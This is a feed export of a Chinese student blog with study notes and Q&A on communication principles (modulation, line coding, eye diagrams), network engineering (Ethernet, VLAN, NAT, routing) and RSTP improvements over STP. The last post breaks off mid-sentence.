什么是线性调制?常见的线性调制有哪些?</p><blockquote><p>正弦载波的幅度随调制信号做线性变化的过程。从频谱上说，已调信号的频谱结构与基带信号的频谱结构相同，只是频率位置发生变化。</p></blockquote><blockquote><p>常见的线性调制有调幅（AM)、双边带调制(DSB)、单边带调制(SSB)和残留边带调制(VSB)</p></blockquote><p>5-5    为什么要抑制载波?相对AM信号来说，抑制载波的双边带信号可以增加多少功效?</p><blockquote><p>抑制载波可以提高调制效率；对于抑制载波的双边带，可以使其调制效率由1/3提高到1</p></blockquote><p>5-9    DSB调制系统和SSB调制系统的抗噪声性能是否相同，为什么?</p><blockquote><p>相同，如果解调器的输入噪声功率密度相同，输入信号功率也相同，则单边带和双边带解调器输出的信噪比是相等的</p></blockquote><h5 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a><strong>第六章</strong></h5><p>6-4    构成AMI码和HDB3码的规则是什么?它们各有什么优缺点?</p><blockquote><p>AMI的编码规则:将消息代码0（空号）仍然变换成传输码0，而把1(传码）交替的变换为传输码的+1，-1…。因此AMI码为三电平序列，三元码，伪三进制，1B/1T码。</p></blockquote><ul><li>AMI的优点:0,1不等概率是也无直流；零频附近的低频分量小；整流后即RZ码；编译码电路简单而且便于观察误码情况</li><li>AMI的缺点是:连续0码多时，RZ码连0也多，不利于提取高质量的位同步信号</li></ul><blockquote><p>HDB3的编码规则:先把消息代码变换AMI码，然后去检查AMI码的连零情况，没有四个或者四个以上的连零串时,这时的AMI码就是HDB3码;当出现四个或者四个以上的连零串时，将四个连零小段的第四个0变换于迁移非0符号同极性的符号，称为v符号（破坏码)。当相邻V符号之间有偶数个非零符号时，再将该小段的第一个0变成+B或者-B（平衡码)，B符号的极性与前一非零符号的极性相反，并让后面的非О符号从V符号开始再交替变化。</p></blockquote><p>HDB3码的优点:保持了AMl的优点，还增加了使连零串减少到至多三个，对于定时信号的恢复是十分有利的。</p><p>6-6    什么是码间串扰?它是如何产生的?对通信质量有什么影响?</p><pre class="line-numbers language-none"><code class="language-none">(1)码间串扰:由于系统的总特性不理想，导致前后码元的波形畸变、展宽，并使前面的波形出现很长的拖尾，蔓延到当前码元的抽样时刻，从而对当前码元的判决造成干扰(2)码间干扰的产生是因为在第k个抽样时刻理想状态时抽样时刻所得的是仅有第k个波形在此时刻被取值，但在实际系统中，会有除了第k个波形以外的波形可能再抽样时刻被取值。码间干扰会导致判决电路对信号进行误判，使信号失真，产生误码，从而通信质量下降(3)码间干扰会导致判决电路对信号进行误判，使信号失真，产生误码，从而通信质量下降<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>6-7     为了消除码间串扰，基带传输系统的传输函数应满足什么条件?其相应的冲激响应应具有什么特点?</p><p>为消除码间串扰，基带传输系统的传输函数应满足:</p><img src="D:\gitee-blog\source\_posts\子域名深度挖掘\传输函数.png"  /><p>即满足无码间串扰频域条件。</p><p>其相应的冲激响应应具有：</p><img src="D:\gitee-blog\source\_posts\子域名深度挖掘\冲激响应.png"  /><p> 即具有无码间串扰时域条件。</p><p>6-8    何谓奈奎斯特速率和奈奎斯特带宽?此时的频带利用率有多大?</p><blockquote><p>理想低通传输特性的带宽称为奈奎斯特带宽,将该系统无码间干扰的最高传输速率称为奈奎斯特速率。此时频带利用率为2B/Hz</p></blockquote><p>6-13    什么是眼图?它有什么作用?由眼图模型可以说明基带传输系统的哪些性能?具有升余弦脉冲波形的HDB,码的眼图应是什么样的图形?</p><blockquote><p>眼图是实验手段估计基带传输系统性能的一种方法。它是指接收滤波器输出信号波形在示波器上叠加所形成的图像</p></blockquote><pre class="line-numbers language-none"><code class="language-none">眼图和系统性能的关系：1.最佳抽样时刻是“眼睛”张最大的时刻;2.对定时误差的灵敏度可由眼睛的斜率决定，斜率越陡，对定时误差就越灵敏;3.图中阴影区域的垂直高度表示信号畸变范围;4.图中央的横轴位置对应判决门限电平;5.在抽样时刻上，上下阴影区的间隔距离之半为噪声容限,即若噪声瞬时值超过这个容限，就可能发生错误判决眼图：一种宏观评价系统性能得一种手段；&#96;最佳抽样时刻：眼睛张开最大得时刻；定时误差灵敏度：眼眶的斜率，斜率越大越敏感；判决明显电平：横轴；噪声容限：纵轴；(1)最佳取样时刻应选择在眼睛张开最大的时刻;(2)眼睛闭合的速率，即眼图斜边的斜率，表示系统对定时误差灵敏的程度，斜边愈陡，对定位误差愈敏感;(3)在取样时刻上，阴影区的垂直宽度表示最大信号失真量;(4)在取样时刻上，上下两阴影区的间隔垂直距离之半是最小噪声容限，噪声瞬时值超过它就有可能发生错误判决;(5)阴影区与横轴相交的区间表示零点位置变动范围，它对于从信号平均零点位置提取定时信息的解调器有重要影响。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>具有升余弦脉冲波形的HDB,码的眼图中间会有一条代表0的水平线</p><h5 id="第七章"><a href="#第七章" class="headerlink" title="第七章"></a><strong>第七章</strong></h5><p>P205页信息</p><p>7-1    什么是数字调制?它和模拟调制有哪些异同点?</p><blockquote><p>数字调制是用载波信号的某些离散状态来表征传送的信息,在接收端对载波信号的离散调制参量进行检测。<br>和模拟调制一样数字调制也有调幅，调频和调相三种基本形式，并可以派生出多种其他形式。在原理上二者并没有什么区别。只不过模拟调制是对载波信号的参量进行离散调制，在接收端也只需对载波信号的离散调制参量估值</p></blockquote><p>7-2    数字调制的基本方式有哪些?其时间波形上各有什么特点?数字调制技术有两种方法:</p><blockquote><p>一是利用模拟调制方法去实现数字式调制，即把数字调制看成是模拟调制的一个特例，把数字基带信号当成模拟信号的特殊情况处理</p></blockquote><blockquote><p>二是利用数字信号的离散取值的特点通过开关键控载波，从而实现数字调制，这种调制方式通常有幅度键控、频率键控和相位键控。其时间波形上来说，有可能是不连续的</p></blockquote><p>7-5    什么是频移键控?2FSK信号产生和解调方法有哪些?</p><blockquote><p>频移键控是指用不同的载频来表示所传送的数字信息。<br>产生:1、利用矩形脉冲序列对一个载波进行调频产生;2、利用受矩形脉冲序列控制的开关电路对两个不同的频率进行选通，即键控法。<br>解调:通常采用非相干解调和相干解调两种方法，同时还有鉴频法，过零检测法和差分检波法</p></blockquote><p>7-6    2FSK信号相邻码元的相位是否连续变化与其产生方法有何关系?</p><blockquote><p>采用模拟调频电路实现的2FSK信号，其相位变化是连续的;采用数字键控法产生的2FSK信号其相位变化不一定连续</p></blockquote><p>7-8    什么是绝对移相?什么是相对移相?他们有何区别?绝对移相是用载波的相位直接表示码元;</p><blockquote><p>相对移相是用相邻码元的相对载波相位值表示数字信息。<br>相对移相信号可以看作是把数字信息序列绝对码变换成相对码,然后根据相对码进行绝对移相而成</p></blockquote><p>7-9    2PSK信号和2DPSK信号可以用哪些方法产生和解调?它们是否可以采用包络检波法解调?为什么?</p><blockquote><p>2PSK信号和2DPSK信号可以用模拟调制法和键控调制法产生;<br>2PSK信号可以用极性比较法，鉴相法解调，2DPSK信号通常用极性比较码变换法，差分相干法解调。<br>它们都不能采用包络检波法解调，因为它们是用相位而不是振幅来携带传送信息的</p></blockquote><p>7-10    2PSK信号及2DPSK信号的功率谱密度有何特点?试将它们与OOK信号的功率谱密度加以比较。</p><blockquote><p>2PSK信号的功率谱密度同样由离散谱和连续谱组成，但当双极性基带信号以相等的概率出现时，不存在离散谱部分。同时，连续谱部分与2ASK信号基本相同，因此，2PSK信号的带宽也与2ASK信号相同。此外，2DPSK信号的带宽也与2ASK信号的相同</p></blockquote><p>补充2DPSK如何克服π现象？</p><p>DPSK</p><pre class="line-numbers language-none"><code class="language-none">2PSK的“倒∏现象”或“反向工作”:在波形图中,假设相干载波的基准相位与2PSK信号的调制载波的基准相位一致(通常默认为0相位)。但是,由于在2PSK信号的载波恢复过程中存在着的相位模糊,即恢复的本地载波与所需的相干载波可能同相,也可能反相,这种相位关系的不确定性将会造成解调出的数字基带信号与发送的数字基带信号正好相反,即“1”变为“0”,“0”变为“1”,判决器输出数字信号全部出错。这种现象称为2PSK 方式的“倒π”现象或“反相工作”。这也是2PSK方式在实际中很少采用的主要原因。另外,在随机信号码元序列中,信号波形有可能出现长时间连续的正弦波形,致使在接收端无法辨认信号码元的起止时刻。为了解决上述问题,可以采用差分相移键控(DPSK)体制。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre> <center><img src="D:\gitee-blog\source\_posts\子域名深度挖掘\2DPSK相干解调法.png" style="zoom:50%;" /></center> ]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;第一章&quot;&gt;&lt;a href=&quot;#第一章&quot; class=&quot;headerlink&quot; title=&quot;第一章&quot;&gt;&lt;/a&gt;&lt;strong&gt;第一章&lt;/strong&gt;&lt;/h5&gt;&lt;p&gt;1-11衡量数字通信系统有效性和可靠性的性能指标有哪些?&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;</summary>
      
    
    
    
    
    <category term="通信原理" scheme="https://shierjinghuang.github.io/tags/%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>网络工程思考题</title>
    <link href="https://shierjinghuang.github.io/2023/03/08/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/"/>
    <id>https://shierjinghuang.github.io/2023/03/08/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/</id>
    <published>2023-03-08T02:23:00.000Z</published>
    <updated>2023-03-09T02:23:21.231Z</updated>
    
    <content type="html"><![CDATA[<h3 id="网络工程思考题"><a href="#网络工程思考题" class="headerlink" title="网络工程思考题"></a>网络工程思考题</h3><p>[TOC]</p><p><strong>网络三大核心：交换、路由、服务</strong></p><h4 id="第一章-概述"><a href="#第一章-概述" class="headerlink" title="第一章 概述"></a>第一章 概述</h4><img src="https://shierjinghuang.github.io/2022/04/15/计算机网络//OSI与TCP协议对比.png" style="zoom: 50%;" /><ul><li>1.2.1  网络的体系结构和协议</li><li>   协议三要素：语法、语义和同步（定时关系）</li><li>1.3     网络的拓扑结构<ul><li>   网络的拓扑结构是指网络中节点之间物理的或逻辑的连接方式</li><li>   5种基本的拓扑结构：网状、星形、树形、总线型和环形</li></ul></li></ul><h4 id="第二章-局域网技术"><a href="#第二章-局域网技术" class="headerlink" title="第二章 局域网技术"></a>第二章 局域网技术</h4><h5 id="2-3-以太网的基本技术"><a href="#2-3-以太网的基本技术" class="headerlink" title="2.3 以太网的基本技术"></a>2.3 以太网的基本技术</h5><blockquote><p>媒体访问控制技术：以太网采用共享媒体方式传输数据信息，即连接在一个以太网上的所有站点使用公共的总线收发数据</p></blockquote><ul><li><p>以太网的媒体访问控制方式使用载波侦听多路访问/冲突检测协议，即CSMA/CD协议，解决站点对共享总线的访问</p></li><li><p>决定发送帧时间的算法:</p><ul><li>非坚持CSMA</li><li>1-坚持CSMA</li><li>P-坚持CSMA</li></ul></li><li><p><strong>CSMA/CD协议发送数据流程:</strong></p><img src="https://shierjinghuang.github.io/2022/04/15/计算机网络/CSMA-CD发送协议.png" style="zoom:50%;" /></li><li><p><strong>冲突时间：</strong></p><ul><li><p>冲突时间是站点开始发送帧时，帧可能发生冲突所花费时间的上限</p><p>冲突时间的作用：</p><ul><li>冲突时间是检测一次冲突所需的最少，超过了该时间，再也不会冲突</li><li>确定了帧的“最小帧长度”</li><li>决定了在总线上出现的最大帧碎片长度</li><li>可以作为冲突后帧要重新发送所需的基本时间延迟计算的基本单位</li></ul></li></ul></li></ul><p><strong>曼彻斯特编码</strong>：在每一位时间的中间，信号有一个跳变，由高到低的跳变用来表示1，由低到高的跳变用来表示0</p><p><strong>不归零制编码的缺点</strong></p><blockquote><ul><li>接收方很难确定一位的开始和结束，特别是在连续多位相同是容易混淆，需要同步信号辅助</li><li>当传输的数据中“1”和“0”的个数不均衡时，会存在直流分量，将影响接收方的正确接收</li></ul></blockquote><h5 id="2-4-10MBps以太网"><a href="#2-4-10MBps以太网" class="headerlink" title="2.4 10MBps以太网"></a>2.4 10MBps以太网</h5><blockquote><p>网卡：网络接口卡，又称网络适配器，通常安装在网络站点内，负责站点和网络之间的通信</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python">网卡的基本功能<span class="token comment"># 提供与站点主机的接口电路，数据缓存器的管理，数据链路控制和管理，编码和译码，网络信息的收发</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="2-7-以太网的交换技术"><a href="#2-7-以太网的交换技术" class="headerlink" title="2.7 以太网的交换技术"></a>2.7 以太网的交换技术</h5><ol><li><p>以太网交换原理：源地址学习，目的地址转发（自学习转发算法）</p></li><li><p>网桥与桥接技术：网桥属于数据链路层网络设备，主要用于连接两个局域网</p><ul><li>网桥的操作过程<ul><li>侦听每个端口上是否有帧到达，保存到达帧的源MAC地址以及接收它的端口号到站缓冲区，查看接收到的每个帧的目的MAC地址。</li><li>广播MAC地址，或站缓冲区中无此地址，转发该帧到所有其它端口；站缓冲区中存在该MAC地址，则转发到相应端口；如果源MAC地址和目的MAC地址所对应的端口相同，则将该帧丢弃</li></ul></li><li>网桥与集线器的重要区别<ul><li>网桥阻止一个局域网的报文传输到另外一个局域网中去，缩小冲突域，增加网络带宽</li></ul></li></ul></li><li><p>生成树协议：</p><p>在存在冗余链路的情况下，在网络中标识出一条无环链路，并临时关闭非工作链路中的网桥端口，当网络中任何一条链路的状态发生变化时，网桥将根据生成树协议重新计算是否因为链路状态的改变而出现新的回路，如果工作链路出现了故障导致帧不能通过，生成树协议将重新计算出一条新的无环链路</p><ul><li>有向无环图，根本目的防止形成回路</li><li>分为生成树协议（STP）与快速生成树协议（RSTP）<ul><li>spanning-tree mode ?                     // 查看支持的生成树协议</li><li>spanning-tree mode rapid-pvst     // 快速生成树协议</li></ul></li></ul></li><li><p>全双工以太网技术：是指在条网络链路上可以同时进行数据接收和发送</p></li></ol><ul><li>广域网中的链路通常是全双工的,但局域网以前一直 工作在半双工方式下。在实际组网时,交换机与交换机之间、交换机与单个工作站之间一毅都采用全双工传输方式。</li></ul><ol start="5"><li>以太网交换机：以太网交换机采用以太网交换技术实现对报文的快速转发，是交换式以太网中区不可少的网络设备。在OSI参考模型中，以太网交换机属于工作在第二层的网络设备<ul><li>交换机的交换方式：静态交换方式与动态交换方式<ul><li>静态交换方式：端口之间是通过人工设置的固定连接来交换数据帧的</li><li>动态交换方式：端口之间是通过动态学习后形成交换通道实现数据帧的交换的</li></ul></li><li>交换机的重要特征：MAC地址表大小、端口的自适应能力、模块的热插拔、端口限速、背板总线带宽、转发速率、端口聚合</li><li> 动态交换方式分为：<strong>存储转发交换方式、直通交换方式、无碎片交换方式</strong></li><li>如何访问交换机：通过交换机中的控制台端口、通过telnet远程登录交换机、通过web方式访问交换机、使用专用的网络管理软件访问交换机（配置、访问等详细命令亮仔整理了）</li></ul></li></ol><h5 id="2-8-虚拟局域网（VLAN）"><a href="#2-8-虚拟局域网（VLAN）" class="headerlink" title="2.8 虚拟局域网（VLAN）"></a>2.8 虚拟局域网（VLAN）</h5><blockquote><p>利用交换机对帧传输的控制能力，在网络的物理拓扑结构基础上建立多个逻辑网络</p></blockquote><ol><li><p>vlan特点：地理位置无关性、划分广域网、系统配置默认使用vlan 1</p></li><li><p>vlan划分：基于端口、基于MAC地址、基于网络层的vlan</p></li><li><p><strong>Vlan技术的优点：隔离网络广播风暴、增强了网络安全性、简化网络管理和维护、提高网络性能</strong></p></li><li><p>实现三个通信：</p><ul><li>无vlan通信</li><li>同一vlan间通信</li><li>不同vlan间通信：三层交换机实现vlan间通信、二层交换机与路由器实现vlan间通信</li></ul></li><li><p>vlan中继协议（VTP）：（实验看亮仔整理）</p><ul><li><p>vtp能否辅助vlan进行接口划分？</p></li><li><p>三种模式：</p><p>①server：<strong>服务器 — 在 VTP 服务器模式下，可创建、修改和删除 VLAN，并为整个 VTP 域指定其他配置参数</strong></p><p>②client：<strong>客户端 — VTP 客户端的行为与 VTP 服务器相同，学习vlan划分不学习接口划分，但不能在 VTP 客户端上创建、更改或删除 VLAN</strong></p><p>③transparent：<strong>透明 — VTP 透明交换机不参加 VTP</strong></p></li></ul></li></ol><p>2.9 无线局域网 <del>（不知道写的啥，看书吧）</del> <strong><del>（其实就是没有讲）</del></strong></p><h4 id="第三章-广域网和网络接入"><a href="#第三章-广域网和网络接入" class="headerlink" title="第三章 广域网和网络接入"></a>第三章 广域网和网络接入</h4><ol><li><p>接入网技术</p><ul><li>电话与拨号接入，ISDN接入，ADSL接入，光纤同轴电缆混合网（HFC），光纤接入，无线接入技术</li></ul></li><li><p>公用数据网：</p><ul><li>不可靠，报文传输</li><li>帧中继，可变帧长，通过链路实现可靠</li></ul></li></ol><h4 id="第四章-网络的互联技术"><a href="#第四章-网络的互联技术" class="headerlink" title="第四章 网络的互联技术"></a>第四章 网络的互联技术</h4><ol><li><p>IP协议功能：</p><img src="https://shierjinghuang.github.io/2022/04/15/计算机网络/IP协议报文.png" style="zoom: 40%;" /><ul><li>寻址与路由</li><li>分段与重组<ul><li>分段：将数据报拆分成一个个能够适合下层技术传输的小数据报</li><li>重组：到达目的地后，需要将拆分后的多个数据报重组成原始数据报</li></ul></li></ul></li><li><p><strong>划分子网、构造超网</strong>（考虑本学期课上讲过，应该有应用题，请看计算机网络课本）</p></li><li><p>静态划分、DHCP动态主机分配协议</p><ul><li><p>静态划分：</p><img src="https://shierjinghuang.github.io/2022/04/15/计算机网络/子网的静态划分.png" style="zoom:50%;" /><ul><li>网络地址：IP地址中主机地址部分全为0</li><li>广播地址：IP地址中主机地址部分全为1</li><li>0.0.0.0<ul><li>代表路由表的缺省路由</li><li>代表主机本身（尚未获得IP地址情况下）</li></ul></li><li>255.255.255.255：受限广播或本地广播</li><li>127.0.0.0/8：Loopback地址，用于测试TCP/IP</li></ul></li><li><p>DHCP动态主机分配协议</p><img src="https://shierjinghuang.github.io/2022/04/15/计算机网络/DHCP动态主机分配协议.png" style="zoom:50%;" /></li></ul></li><li><p>网络地址转换-NAT</p><blockquote><p>缘由：IP地址严重不足</p></blockquote><ul><li><p>静态NAT：实现内部IP和外部IP的一对一映射，但不能节约IP地址</p></li><li><p>动态NAT：从多个外部地址中选择一个对应内部地址，最多只能有k台内部主机同时访问Internet</p></li><li><p>端口NAT（NAPT）：只要一个外部地址，通过TCP和UDP的端口号在内部地址和外部地址之间建立映射关系，进行内部地址和外部地址的转换</p></li></ul></li><li><p>静态路由、动态路由、默认路由</p><ul><li>静态路由：由网络管理员手工配置，不会根据网络变化而自动调整</li><li>动态路由：根据路由信息自动生成，适用于大型网络，可以提高网络的健壮性和性能</li><li>默认路由：默认路由Default Gateway，也称缺省路由，在没有找到匹配的路由项时所使用的路由，在路由表中，默认路由以到网络0.0.0.0/0的形式出现</li></ul></li><li><p>动态路由协议</p><ul><li>路由信息协议（RIP）<ul><li>典型的距离向量路由协议，具有实现简单、开销小等优点，不适用于大型网络</li><li><strong>RIP协议中的路由循环问题（个人感觉会有）</strong><ul><li>触发更新：一旦路由器的路由信息表发生变化，立刻向邻居路由器广播更新后的路由信息表，而不必等上0～30秒时间到下一个广播周期再发送路由信息表</li><li>水平分割：不向路由信息的来源路由器回传自身的路由信息</li><li>带毒性逆转的水平分割：向路由信息的来源路由器回传路由信息时，距离值被设为16</li></ul></li></ul></li><li>最短路径优先路由协议（OSPF路由协议）<ul><li>OSPF：Open Shortest Path First，开放的最短路径优先路由协议</li><li>OSPF是一种典型的链路状态路由协议，每个OSPF路由器均维护着一个数据库，它反映了整个网络的拓扑结构</li></ul></li></ul></li><li><p>访问控制列表</p><ul><li>标准ACL</li><li>扩展ACL</li></ul></li><li><p>虚拟专用网虚拟专用网</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;网络工程思考题&quot;&gt;&lt;a href=&quot;#网络工程思考题&quot; class=&quot;headerlink&quot; title=&quot;网络工程思考题&quot;&gt;&lt;/a&gt;网络工程思考题&lt;/h3&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;网络三大核心：交换、路由、服务&lt;/strong&gt;&lt;/p&gt;
</summary>
      
    
    
    
    <category term="网络工程相关" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3/"/>
    
    
    <category term="网络工程" scheme="https://shierjinghuang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>生成树的改进 RSTP与MSTP</title>
    <link href="https://shierjinghuang.github.io/2023/03/06/%E7%94%9F%E6%88%90%E6%A0%91%E7%9A%84%E6%94%B9%E8%BF%9B%20RSTP%E4%B8%8EMSTP/"/>
    <id>https://shierjinghuang.github.io/2023/03/06/%E7%94%9F%E6%88%90%E6%A0%91%E7%9A%84%E6%94%B9%E8%BF%9B%20RSTP%E4%B8%8EMSTP/</id>
    <published>2023-03-06T01:25:00.000Z</published>
    <updated>2023-04-09T07:25:22.534Z</updated>
    
    <content type="html"><![CDATA[<h1 id="生成树的改进-RSTP与MSTP"><a href="#生成树的改进-RSTP与MSTP" class="headerlink" title="生成树的改进 RSTP与MSTP"></a>生成树的改进 RSTP与MSTP</h1><p>[TOC]</p><h2 id="快速生成树协议RSTP"><a href="#快速生成树协议RSTP" class="headerlink" title="快速生成树协议RSTP"></a>快速生成树协议RSTP</h2><blockquote><p>IEEE 802.1W中定义的RSTP可以视为STP的改进版本，RSTP在许多方面对STP进行了优化，它的收敛速度更快，而且能够兼容STP</p></blockquote><h3 id="RSTP对STP的改进："><a href="#RSTP对STP的改进：" class="headerlink" title="RSTP对STP的改进："></a>RSTP对STP的改进：</h3><ul><li>RSTP对STP的改进：<ul><li>通过端口角色的增补，简化了生成树协议的理解及部署；</li><li>端口状态的重新划分；</li><li>配置BPDU格式的改变，充分利用了STP协议报文中的Flag字段，明确了端口角色；</li><li>配置BPDU的处理发生变化；</li><li>快速收敛；</li><li>增加保护功能。</li></ul></li></ul><h4 id="改进点1：端口角色的改进："><a href="#改进点1：端口角色的改进：" class="headerlink" title="改进点1：端口角色的改进："></a>改进点1：端口角色的改进：</h4><p>RSTP的端口角色共有4种：根端口、指定端口、Alternate端口和Backup端口。</p><p> <center><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\Alternate端口.png" alt="Alternate端口" style="zoom: 67%;" /><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\备份端口.png" alt="备份端口"style="zoom: 67%;" /> </center></p>根端口和指定端口的作用同STP中定义，Alternate端口和Backup端口的描述如下：<ul><li>从配置BPDU报文发送角度来看：<ul><li>Alternate端口就是由于学习到其它网桥发送的配置BPDU报文而阻塞的端口</li><li>Backup端口就是由于学习到自己发送的配置BPDU报文而阻塞的端口</li></ul></li><li>从用户流量角度来看：<ul><li>Alternate端口提供了从指定桥到根的另一条可切换路径，作为根端口的备份端口</li><li>Backup端口作为指定端口的备份，提供了另一条从根桥到相应网段的备份通路</li></ul></li></ul><blockquote><p>给一个RSTP域内所有端口分配角色的过程就是整个拓扑收敛的过程</p></blockquote><h4 id="改进点2：端口状态的改进"><a href="#改进点2：端口状态的改进" class="headerlink" title="改进点2：端口状态的改进"></a>改进点2：端口状态的改进</h4><p>RSTP的状态规范缩减为3种，根据端口是否转发用户流量和学习MAC地址来划分:</p><ul><li>Discarding状态：不转发用户流量也不学习MAC地址</li><li>Learning状态：不转发用户流量但是学习MAC地址</li><li>Forwarding状：既转发用户流量又学习MAC地址。</li></ul><table><thead><tr><th align="center">STP端口状态</th><th align="center">RSTP端口状态</th><th align="center">端口在拓扑中的角色</th></tr></thead><tbody><tr><td align="center">Forwarding</td><td align="center">Forwarding</td><td align="center">包括根端口、指定端口</td></tr><tr><td align="center">Learning</td><td align="center">Learning</td><td align="center">包括根端口、指定端口</td></tr><tr><td align="center">Listening</td><td align="center">Discarding</td><td align="center">包括根端口、指定端口</td></tr><tr><td align="center">Blocking</td><td align="center">Discarding</td><td align="center">包括Alternate端口、Backup端口</td></tr><tr><td align="center">Disabled</td><td align="center">Discarding</td><td align="center">包括Disable端口</td></tr></tbody></table><h4 id="改进点3：配置BPDU-RST-BPDU"><a href="#改进点3：配置BPDU-RST-BPDU" class="headerlink" title="改进点3：配置BPDU - RST BPDU"></a>改进点3：配置BPDU - RST BPDU</h4><p><strong>RSTP的配置BPDU充分利用了STP报文中的Flag字段，明确了端口角色</strong></p><ul><li>除了保证和STP格式基本一致之外，RSTP作了如下变化：<ul><li>Type字段：配置BPDU类型不再是0而是2，所以运行STP的设备收到RSTP的配置BPDU时会丢弃</li><li>Flag字段：使用了原来保留的中间6位，这样改变的配置BPDU叫做RST BPDU</li></ul></li></ul><h5 id="RST-BPDU报文格式："><a href="#RST-BPDU报文格式：" class="headerlink" title="RST BPDU报文格式："></a>RST BPDU报文格式：</h5><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\RST BPDU报文格式.png" alt="RST BPDU报文格式" style="zoom: 67%;" /><h5 id="RST-BPDU与STP配置BPDU报文格式不同点"><a href="#RST-BPDU与STP配置BPDU报文格式不同点" class="headerlink" title="RST BPDU与STP配置BPDU报文格式不同点"></a>RST BPDU与STP配置BPDU报文格式不同点</h5><ul><li>BPDU类型，1 Byte，RST BPDU的类型值为0x02。</li><li>标志，1 Byte，包括：<ul><li>bit 7：TCA，表示拓扑变化确认；</li><li>bit 6：Agreement，表示同意，用于P/A机制；</li><li>bit 5：Forwarding，表示转发状态；</li><li>bit 4：Learning，表示学习状态；</li><li>bit 3和bit 2：表示端口角色, 00表示未知端口, 01表示替代或备份端口, 10表示根端口, 11表示指定端口</li><li>bit 1：Proposal，表示提议，用于P/A机制；</li><li>bit 0：TC，表示拓扑变化。</li></ul></li></ul><h4 id="改进点4：配置BPDU的处理"><a href="#改进点4：配置BPDU的处理" class="headerlink" title="改进点4：配置BPDU的处理"></a>改进点4：配置BPDU的处理</h4><h5 id="RSTP对配置BPDU的发送方式进行了改进"><a href="#RSTP对配置BPDU的发送方式进行了改进" class="headerlink" title="RSTP对配置BPDU的发送方式进行了改进"></a>RSTP对配置BPDU的发送方式进行了改进</h5><blockquote><p>在拓扑稳定后，无论非根桥设备是否接收到根桥传来的配置BPDU报文，非根桥设备仍然按照Hello Time规定的时间间隔发送配置BPDU，该行为完全由每台设备自主进行</p></blockquote><h5 id="更短的BPDU超时时间"><a href="#更短的BPDU超时时间" class="headerlink" title="更短的BPDU超时时间"></a>更短的BPDU超时时间</h5><p>如果一个端口在超时时间（即三个周期，超时时间＝Hello Time×3）内没有收到上游设备发送过来的配置BPDU，那么该设备认为与此邻居之间的协商失败</p><blockquote><p>STP需要先等待一个Max Age</p></blockquote><h5 id="处理次优BPDU"><a href="#处理次优BPDU" class="headerlink" title="处理次优BPDU"></a>处理次优BPDU</h5><p>当一个端口收到上游的指定桥发来的RST BPDU报文时，该端口会将自身缓存的RST BPDU与收到的RST BPDU进行比较如果该端口缓存的RST BPDU优于收到的RST BPDU，那么该端口会直接丢弃收到的RST BPDU，立即回应自身缓存的RST BPDU，从而加快收敛速度</p><ul><li><p>STP：      STP只有指定端口会立即处理次优BPDU，其他端口会忽略次优BPDU，等到Max Age计时器超时后，缓存的次优BPDU才会老化，然后发送自身更优的BPDU，进行新一轮的拓扑收敛。</p></li><li><p>RSTP：   RSTP处理次优BPDU报文不再依赖于任何定时器，解决拓扑收敛，同时RSTP的任何端口角色都会处理次优BPDU，从而加快了拓扑收敛。</p></li></ul><h4 id="改进点5：快速收敛机制"><a href="#改进点5：快速收敛机制" class="headerlink" title="改进点5：快速收敛机制"></a>改进点5：快速收敛机制</h4><h5 id="快速收敛机制："><a href="#快速收敛机制：" class="headerlink" title="快速收敛机制："></a>快速收敛机制：</h5><ul><li><p>如果网络中一个根端口失效，那么网络中最优的Alternate端口将成为根端口，进入Forwarding状态。因为通过这个Alternate端口连接的网段上必然有个指定端口可以通往根桥</p></li><li><p>如果网络中一指定端口失效，那么网络中最优的Backup端口将成为指定端口，进入Forwarding状态。因为Backup端口作为指定端口的备份，提供了另一条从根桥到相应网段的备份通路</p></li></ul><center><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\根端口快速切换.png" alt="根端口快速切换" style="zoom:67%;" /><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\指定端口快速切换.png" alt="指定端口快速切换" style="zoom:67%;" /></center>##### 边缘端口 (Edge Port)机制：<blockquote><p>在RSTP里面，如果某一个端口位于整个网络的边缘，即不再与其他交换设备连接，而是直接与终端设备直连，这种端口可以设置为边缘端口</p></blockquote><p>边缘端口不参与RSTP计算，可以由Discarding直接进入Forwarding状态，同时边缘端口的UP和Down，不会引起网络拓扑的变动</p><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\RSTP边缘端口.png" alt="RSTP边缘端口" style="zoom: 50%;" /><p>但是一旦边缘端口收到配置BPDU，就丧失了边缘端口属性，成为普通STP端口，并重新进行生成树计算，从而引起网络震荡</p><h5 id="Proposal-Agreement机制："><a href="#Proposal-Agreement机制：" class="headerlink" title="Proposal/Agreement机制："></a>Proposal/Agreement机制：</h5><p>简称P/A机制，RSTP通过P/A机制加快了上游端口进入Forwarding状态的速度。<br>当一个端口被选举成为指定端口之后,会先进入Discarding状态，再通过P/A机制快速进入Forwarding状态</p><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\Proposal_Agreement机制：.png" alt="P/A机制" style="zoom:67%;" /><p>事实上对于STP，指定端口的选择可以很快完成，主要的速度瓶颈在于：为了避免环路，必须等待足够长的时间，使全网的端口状态全部确定，也就是说必须要等待至少一个Forward 